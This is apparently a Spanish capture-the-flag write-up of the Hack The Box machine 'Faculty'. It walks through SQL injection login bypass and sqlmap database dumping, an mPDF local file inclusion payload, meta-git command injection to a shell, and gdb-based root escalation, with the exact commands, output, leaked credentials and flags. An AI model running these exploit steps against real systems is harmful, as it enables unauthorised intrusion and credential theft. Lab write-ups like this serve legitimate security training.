
![[Pasted image 20241008184434.png]]

https://www.hackthebox.com/machines
---

| ![[Pasted image 20241007194520.png]]![[Pasted image 20241007194515.png]]**  OS** | ![[Pasted image 20241007195719.png]]**  Difficult** | **Tags**       | **RELEASED**   | **Social Media**            |
| -------------------------------------------------------------------------------- | --------------------------------------------------- | -------------- | -------------- | --------------------------- |
| **LINUX**                                                                        | **MEDIUM**                                          | #SQLInjection  | **09/09/2023** | https://github.com/gorkaaaa |

Skills:

- Web Enumeration
- SQL Injection (SQLI) - Manual Blind Time Based [Python Scripting]
- Information Leakage - Error Messages
- Login bypass - SQLI

- Abusing MPDF - Local File Inclusion (LFI)
- Abusing meta-git command - RCE via insecure command formatting
- Abusing gdb capabilitie (cap_sys_ptrace+ep) [Privilege Escalation]

---

# Enumeración
*Esta fase va a consistir en hacer una enumeración general sobre la máquina para poder valorar vectores de intrusión y valorar posibles ataques.*

1. Comprobamos Conectividad.
```r
❯ ping -c 1 10.10.11.169
PING 10.10.11.169 (10.10.11.169) 56(84) bytes of data.
64 bytes from 10.10.11.169: icmp_seq=1 ttl=63 time=115 ms

--- 10.10.11.169 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 115.255/115.255/115.255/0.000 ms
```
*Vemos que tenemos conectividad con la máquina.*

2. Enumeración De Sistema Operativo con script.
```r
❯ whichSystem.py 10.10.11.169

	10.10.11.169 (ttl -> 63): Linux
```
*Podemos ver que estamos ante una máquina linux.*

3. Enumeración de Puertos con nmap.
```r
❯ nmap -p- --min-rate 5000 -Pn -n -sS -T5 10.10.11.169 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
*Vemos que tenemos dos puertos abiertos...*

```R
❯ extractPorts allPorts
───────┬──────────────────────────────────────
       │ File: extractPorts.tmp
───────┬──────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.169
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┬──────────────────────────────────────
```
*Nos copiamos los puertos en la clipboard...*

```r
❯ nmap -p22,80 -sCV 10.10.11.169
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
*Podemos ver un dominio...*

4. Enumeración de puertos.
```r
❯ nvim /etc/hosts
❯ cat /etc/hosts | grep "faculty"
10.10.11.169  faculty.htb
```
*Agregamos el dominio encontrado al /etc/hosts ya que se esta aplicando virtual hosting.*

5. Puerto 80
![[Pasted image 20241008191343.png]]
*Podemos ver esta interfaz web...*

![[Pasted image 20241008191430.png]]
*Porbamos una injección sql básica...*

![[Pasted image 20241008191446.png]]
*Podemos ver esto...*

```R
❯ gobuster dir -u http://faculty.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 4860]
/index.php            (Status: 302) [Size: 12193] [--> login.php]
/header.php           (Status: 200) [Size: 2871]
/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
/test.php             (Status: 500) [Size: 0]
/topbar.php           (Status: 200) [Size: 1206]
```
*Vemos algunas rutas interesantes...*

![[Pasted image 20241008191908.png]]
*Cuando entremos al /admin podemos ver lo siguiente...*

![[Pasted image 20241008192005.png]]
*Cerramos la sesion para volver a probar SQLI*

![[Pasted image 20241008192038.png]]
*Ponemos la siguiente injección...*

![[Pasted image 20241008192056.png]]
*Vemos que ahora somos Administrador...*

![[Pasted image 20241008192233.png]]
*Vamos a probar de sacar credenciales...*

![[Pasted image 20241008192419.png]]
*Interceptamos la petición y probamosa a poner una ' ...*

```html
</b>:  Trying to get property 'num_rows' of non-object in <b>/var/www/scheduling/admin/admin_class.php</b>
```
*Podemos ver una ruta leak...*

```r
username=admin' order by 100-- -&password=admin

</b>:  Trying to get property 'num_rows' of non-object in <b>/var/www/scheduling/admin/admin_class.php</b>
```
*Podemos ver que nos da error...*

```r
username=admin' order by 5-- -&password=admin

1
```
*Aquí podemos ver que ya no nos da error.*

6. SQLI
```r
❯ sqlmap --risk 3 --level 5 --random-agent --dump-all -r ./request --technique=T --time-sec=1 --batch
        ___
       __H__
 ___ ___[ ]_____ ___ ___  {1.8.3#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin" AND (SELECT 2186 FROM (SELECT(SLEEP(5)))aHsm)-- xkWh&password=admin"
---

[BASE DE DATOS]
[15:36:47] [INFO] retrieved: scheduling_db
[15:38:29] [INFO] fetching tables for databases: 'information_schema, scheduling_db'

[TABLAS DE SCHEDULING_DB]
[15:38:29] [INFO] fetching number of tables for database 'scheduling_db'
[15:38:29] [INFO] retrieved: 6
[15:50:43] [INFO] resumed: class_schedule_info
[15:50:43] [INFO] resumed: courses
[15:50:43] [INFO] resumed: faculty
[15:50:43] [INFO] resumed: schedules
[15:50:43] [INFO] resumed: subjects
[15:50:43] [INFO] resumed: users
```
*Hemos listado el nombre de la base de datos y sus tablas...*

```r
❯ sqlmap --risk 3 --level 5 --random-agent -r ./request --technique=T --time-sec=1 --batch --columns -D scheduling_db
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[15:53:17] [INFO] fetching columns for table 'class_schedule_info' in database 'scheduling_db'
[15:53:25] [INFO] retrieved: course_id
[15:54:05] [INFO] retrieved: int
[15:54:18] [INFO] retrieved: id
[15:54:27] [INFO] retrieved: int
[15:54:41] [INFO] retrieved: schedule_id
[15:55:29] [INFO] retrieved: int
[15:55:42] [INFO] retrieved: subject
[15:56:09] [INFO] retrieved: int


[15:56:23] [INFO] fetching columns for table 'subjects' in database 'scheduling_db'
[15:56:23] [INFO] retrieved: 3
[15:56:27] [INFO] retrieved: description
[15:57:12] [INFO] retrieved: text
[15:57:33] [INFO] retrieved: id
[15:57:41] [INFO] retrieved: int
[15:57:55] [INFO] retrieved: subj ect
[15:58:23] [INFO] retrieved: varchar(200)


[15:59:10] [INFO] fetching columns for table 'courses' in database 'scheduling_db'
[15:59:10] [INFO] resumed: 3
[15:59:10] [INFO] resumed: course
[15:59:10] [INFO] retrieved: varchar(200)
[15:59:57] [INFO] retrieved: description
[16:00:43] [INFO] retrieved: text
[16:01:03] [INFO] retrieved: id
[16:01:12] [INFO] retrieved: int


[16:01:26] [INFO] fetching columns for table 'users' in database 'scheduling_db'
[16:01:26] [INFO] retrieved: 5
[16:01:29] [INFO] retrieved: id
[16:01:38] [INFO] retrieved: int
[16:01:53] [INFO] retrieved: name
[16:02:08] [INFO] retrieved: text
[16:02:28] [INFO] retrieved: password
[16:03:03] [INFO] retrieved: text
[16:03:23] [INFO] retrieved: type
[16:03:42] [INFO] retrieved: tinyint(1)
[16:04:28] [INFO] retrieved: username
[16:04:58] [INFO] retrieved: varchar(200)
```
*Vemos una interesante...*

```r
❯ sqlmap --risk 3 --level 5 --random-agent -r ./request --technique=T --time-sec=1 --batch --dump -D scheduling_db -T users
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.3#stable}
|_ -| . [.]     | . | . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

|1 |Administrator|1|1fecbe762af147c1176a0fc2c722a345|admin|
```
*Vemos que hemos obtenido las credenciales...*

![[Pasted image 20241008201613.png]]
*Ahora vamos a ver un poco las web... Hay algo que nos llama la atención.*

![[Pasted image 20241008201638.png]]
*Probamos a generar un pdf y podemos ver en la url /mpdf/*
# Explotación
*En esta fase vamos a ya tener un vector de ataque previamente enumerado y vamos a explotarlo.*

```r
❯ searchsploit mpdf
mPDF 7.0 - Local File Inclusion | php/webapps/50995.py
```
*Vemos este recurso que es interesante...*

```r
❯ searchsploit -m php/webapps/50995.py
  Exploit: mPDF 7.0 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/50995
     Path: /usr/share/exploitdb/exploits/php/webapps/50995.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/user/HTB/Faculty/content/50995.py
```
*Copiamos el recurso....*

```python
payload = f'<annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" />'
```
*Podemos ver esto en el codigo...*

![[Pasted image 20241008202513.png]]
*Podemos ver que es una especie de HTML*

![[Pasted image 20241008203703.png]]
*Podemos ver que tenemos esta cadena...*

![[Pasted image 20241008203850.png]]
*Ahora vemos en principio que no hay nada...*

![[Pasted image 20241008204504.png]]
*Cambiamos el contenido y ponemos la ruta que hemos visto antes...*

![[Pasted image 20241008204606.png]]
*Ponemos este valor...*

![[Pasted image 20241008204702.png]]
*Ahora nos descargamos el archivo.*

```R
sched:Co.met06aci.dly53ro.per
```
*Tenemos estas credenciales...*

```r
❯ ssh gbyolo@10.10.11.169
gbyolo@faculty:~$ export TERM=xterm
```
*Ahora vemos que estamos conectados.*

```R
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```
*Vemos que podemos ejecutar el comando meta-git como el usuario developer.*

```R
gbyolo@faculty:~$ sudo -u developer /usr/local/bin/meta-git
Usage: meta-git [options] [command]

Options:
  -h, --help  output usage information

Commands:
  add         Add file contents to the index
  branch      List, create, or delete branches
  checkout    Switch branches or restore working tree files
  clean       Remove untracked files from the working tree
  clone       Clone meta and child repositories into new directories
  commit      Record changes to the repository
  diff        Show changes between commits, commit and working tree, etc
  fetch       Download objects and refs from another repository
  merge       Join two or more development histories together
  pull        Fetch from and integrate with another repository or a local branch
  push        Update remote refs along with associated objects
  remote      Manage set of tracked repositories
  status      Show the working tree status
  tag         Create, list, delete or verify a tag object signed with GPG
  update      Clone any repos that exist in your .meta file but aren t cloned locally
  help [cmd]  display help for [cmd]
```
*Vemos que podemos ejecutarlo sin problema.*

```r
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'SSS||whoami'
developer
```
*Vemos que hemos conseguido tener una respuesta...*

```r
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'SSS||bash'
developer@faculty:/tmp$
```
*Vemos que hemos conseguido una bash...*

```R
developer@faculty:~$ cat user.txt
d58b42c7f4f6ad7df6f516b3e6c2ecba
```
*Tenemos la user flag!*

# Escalada de privilegios
*Esta fase va a consistir en pasar de ser un usuario no privilegiado a ser el administrador del sistema aprovechandonos de fallos en la seguridad internos del servidor.*

1. Listar permisos
```r
developer@faculty:~$ id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
```
*Lo de debug nos llama la atención así que vamos a listar archivos...*

2. Busqueda de recursos con permisos de 1001
```r
developer@faculty:/$ find / -group debug 2>/dev/null
/usr/bin/gdb
```
*Vemos que tenemos un directorio...*

3. Listar permisos del recurso encontrado.
```r
developer@faculty:/$ ls -l /usr/bin/gdb
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
```
*Vemos que tenemos permiso de ejecución...*

4. Procesos cuyo propietario es root...
```r
developer@faculty:/$ ps -faux | grep "root"
root  692  0.0  0.9  26896 18208 ?   Ss   19:08   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
```
*Este nos llama la atención...*

5. gdb
```r
developer@faculty:/$ gdb -p 692
(gdb)
```
*Nos conectamos al gdb*

```r
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 2176]
```
*Vemos que se ha ejecutado las instrucción de forma correcta.*

```r
developer@faculty:/tmp$ bash -p
bash-5.0# whoami
root
```
*Ahora vemos que somos root.*

```r
bash-5.0# cat root.txt
6ed32b23ae460d522ea2d3e145940e4a
```
*Ahora vemos que ya tenemos la root falg!*

#SQLInjection 
```r
❯ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --flush --fresh-queries --level=5 --risk=3 --batch
````
*cookies*